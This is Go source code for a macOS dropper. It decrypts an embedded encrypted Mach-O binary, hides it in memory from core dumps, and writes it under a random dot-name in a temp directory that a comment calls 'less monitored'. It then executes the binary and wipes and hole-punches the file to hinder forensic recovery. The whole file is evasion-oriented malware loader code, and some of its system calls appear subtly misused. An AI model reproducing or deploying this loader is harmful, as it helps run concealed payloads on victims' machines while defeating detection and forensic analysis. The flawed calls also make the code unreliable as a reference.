//go:build darwin
// +build darwin

package main

import (
	_ "embed"
	"crypto/rand"
	"crypto/subtle"
	"encoding/hex"
	"fmt"
	"log"
	"math/big"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/chacha20poly1305"
)

//go:embed encrypted_Input.bin
var encryptedBytes []byte

//go:embed config.txt
var configData string

// Default Argon2 parameters
const (
	argonTime    = 1
	argonMemory  = 64 * 1024
	argonThreads = 4
	argonKeyLen  = chacha20poly1305.KeySize
)

// Architecture constants
const (
	archARM64 = 1
	archX86_64 = 2
)

func main() {
	// Check if running on supported architecture
	arch, err := detectArchitecture()
	if err != nil {
		log.Fatalf("Failed to detect architecture: %v", err)
	}
	
	// Decrypt the embedded Mach-O binary
	machoBytes, err := decryptFile()
	if err != nil {
		log.Fatalf("Failed to decrypt file: %v", err)
	}
	
	// Lock memory to prevent swapping and core dumps
	// Convert slice to []byte for Mlock
	if err := syscall.Mlock(machoBytes); err != nil {
		log.Printf("Warning: Failed to lock memory: %v", err)
	}
	
	// Note: macOS doesn't support MADV_DONTDUMP directly
	// We'll use MADV_NOCORE which is the macOS equivalent
	// But we need to use the raw syscall since it's not exposed in Go's syscall package
	const MADV_NOCORE = 5 // macOS specific
	const SYS_MADVISE = 75 // macOS specific syscall number
	_, _, errno := syscall.Syscall(SYS_MADVISE, 
	   uintptr(unsafe.Pointer(&machoBytes[0])), 
	   uintptr(len(machoBytes)), 
	   uintptr(MADV_NOCORE))
	if errno != 0 {
	   log.Printf("Warning: Failed to mark memory as not dumpable: %v", errno)
	}
	
	// Execute the decrypted Mach-O binary
	executeMachO(machoBytes, arch)
	
	// This point is only reached if execution fails
	// Ensure memory is securely wiped
	secureWipe(machoBytes)
	runtime.KeepAlive(machoBytes) // Prevent optimization from removing the wipe
}

func decryptFile() ([]byte, error) {
	// Parse config data (password, salt, nonce)
	lines := strings.Split(strings.TrimSpace(configData), "\n")
	if len(lines) < 3 {
		return nil, fmt.Errorf("invalid config data format")
	}

	password, err := hex.DecodeString(lines[0])
	if err != nil {
		return nil, err
	}

	salt, err := hex.DecodeString(lines[1])
	if err != nil {
		return nil, err
	}

	nonce, err := hex.DecodeString(lines[2])
	if err != nil {
		return nil, err
	}

	// Derive the key using the same Argon2id parameters
	key := argon2.IDKey(password, salt, argonTime, argonMemory, argonThreads, argonKeyLen)

	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, err
	}

	// Decrypt and verify the data
	decryptedBytes, err := aead.Open(nil, nonce, encryptedBytes, nil)
	if err != nil {
		return nil, err
	}

	return decryptedBytes, nil
}

// generateRandomString creates a random string of specified length
func generateRandomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		result[i] = charset[n.Int64()]
	}
	return string(result), nil
}

// secureWipe overwrites a byte slice with zeros using constant-time operations
func secureWipe(data []byte) {
	// Get pointer to data for constant-time operations
	dataPtr := unsafe.Pointer(&data[0])
	
	// Create a zero buffer of the same size
	zeros := make([]byte, len(data))
	
	// Use constant-time copy to prevent optimization
	subtle.ConstantTimeCopy(1, data, zeros)
	
	// Ensure the wipe isn't optimized away
	runtime.KeepAlive(data)
	runtime.KeepAlive(dataPtr)
	
	// Force garbage collection
	runtime.GC()
}

// detectArchitecture determines the current CPU architecture
func detectArchitecture() (int, error) {
	// Create buffer to hold the result
	var buf [8]byte
	bufLen := uintptr(8)
	
	// Name of the sysctl to query
	mib := "hw.optional.arm64"
	mibPtr, err := syscall.BytePtrFromString(mib)
	if err != nil {
		return 0, fmt.Errorf("failed to convert sysctl name to byte pointer: %v", err)
	}
	
	// Call sysctlbyname to check if ARM64 is supported
	_, _, errno := syscall.Syscall6(
		syscall.SYS___SYSCTL,
		uintptr(unsafe.Pointer(mibPtr)),
		uintptr(len(mib)),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufLen)),
		0,
		0,
	)
	
	if errno != 0 {
		// If syscall fails, assume x86_64 (most common fallback)
		return archX86_64, nil
	}
	
	// Check the result - if non-zero, we're on ARM64
	if buf[0] != 0 {
		return archARM64, nil
	}
	
	return archX86_64, nil
}

// getTempPath returns a secure path for temporary files
func getTempPath() (string, error) {
	// Use user-specific temp directory instead of /tmp
	// This is more secure and less monitored
	userTempDir := filepath.Join("/private/var/folders")
	
	// If we can't access the user temp dir, fall back to /tmp
	if _, err := os.Stat(userTempDir); err != nil {
		randomStr, err := generateRandomString(12)
		if err != nil {
			return "", err
		}
		return filepath.Join("/tmp", "."+randomStr), nil
	}
	
	// Try to find a user-specific temp folder
	entries, err := os.ReadDir(userTempDir)
	if err != nil || len(entries) == 0 {
		// Fall back to /tmp if we can't access user folders
		randomStr, err := generateRandomString(12)
		if err != nil {
			return "", err
		}
		return filepath.Join("/tmp", "."+randomStr), nil
	}
	
	// Look for folders that might be user-specific
	for _, entry := range entries {
		if entry.IsDir() {
			subPath := filepath.Join(userTempDir, entry.Name(), "T")
			if _, err := os.Stat(subPath); err == nil {
				// Found a valid user temp directory
				randomStr, err := generateRandomString(12)
				if err != nil {
					return "", err
				}
				return filepath.Join(subPath, "."+randomStr), nil
			}
		}
	}
	
	// Fall back to /tmp if we can't find a user temp dir
	randomStr, err := generateRandomString(12)
	if err != nil {
		return "", err
	}
	return filepath.Join("/tmp", "."+randomStr), nil
}

// punchHole overwrites and then punches a hole in a file to make forensic recovery harder
func punchHole(fd int) error {
	// First, overwrite the file with zeros
	var stat syscall.Stat_t
	err := syscall.Fstat(fd, &stat)
	if err != nil {
		return err
	}
	
	// Get file size from stat
	fileSize := stat.Size
	
	// Create a buffer of zeros
	zeros := make([]byte, 4096) // Use 4K blocks for efficiency
	
	// Overwrite the file with zeros
	for offset := int64(0); offset < fileSize; offset += 4096 {
		writeLen := 4096
		if offset+4096 > fileSize {
			writeLen = int(fileSize - offset)
		}
		
		_, err := syscall.Pwrite(fd, zeros[:writeLen], offset)
		if err != nil {
			return err
		}
	}
	
	// Sync to ensure writes hit disk
	syscall.Fsync(fd)
	
	// Now punch a hole in the file using F_PUNCHHOLE if available
	// Note: This is macOS specific and may not work on all filesystems
	// The constants below are from macOS fcntl.h
	const F_PUNCHHOLE = 99
	
	// Try to punch a hole in the entire file
	_, _, errno := syscall.Syscall6(
		syscall.SYS_FCNTL,
		uintptr(fd),
		uintptr(F_PUNCHHOLE),
		uintptr(0), // offset
		uintptr(fileSize), // length
		0, 0,
	)
	
	if errno != 0 {
		return fmt.Errorf("failed to punch hole: %v", errno)
	}
	
	return nil
}

// executeMachO handles the Mach-O binary execution process
func executeMachO(machoBytes []byte, arch int) {
	// Get a secure temporary path
	tmpPath, err := getTempPath()
	if err != nil {
		log.Fatalf("Failed to generate temporary path: %v", err)
	}
	
	log.Printf("Dropping decrypted Mach-O binary to: %s", tmpPath)
	
	// Write the decrypted Mach-O binary to the temporary file
	if err := os.WriteFile(tmpPath, machoBytes, 0700); err != nil {
		log.Fatalf("Failed to write temporary file: %v", err)
	}
	
	// Open the file for hole punching later
	fd, err := syscall.Open(tmpPath, syscall.O_RDWR, 0)
	if err != nil {
		log.Printf("Warning: Failed to open file for hole punching: %v", err)
	}
	
	// Securely wipe the decrypted binary from memory
	log.Printf("Securely wiping %d bytes of decrypted binary from memory", len(machoBytes))
	secureWipe(machoBytes)
	
	// Verify the file exists and is executable before attempting to execute it
	if _, err := os.Stat(tmpPath); err != nil {
		log.Fatalf("Error: File does not exist or cannot be accessed: %v", err)
	}
	
	log.Printf("Executing binary at: %s", tmpPath)
	
	// Execute the binary using syscall.Exec which replaces the current process
	err = syscall.Exec(tmpPath, []string{tmpPath}, os.Environ())
	
	// If we reach here, exec failed
	log.Printf("Exec failed: %v, attempting cleanup", err)
	
	// Punch a hole in the file if we have a valid file descriptor
	if fd > 0 {
		if err := punchHole(fd); err != nil {
			log.Printf("Warning: Failed to punch hole in file: %v", err)
		}
		syscall.Close(fd)
	}
	
	// Remove the file
	if err := os.Remove(tmpPath); err != nil {
		log.Printf("Warning: Failed to remove temporary file: %v", err)
	}
	
	log.Fatalf("Failed to execute binary: %v", err)
} 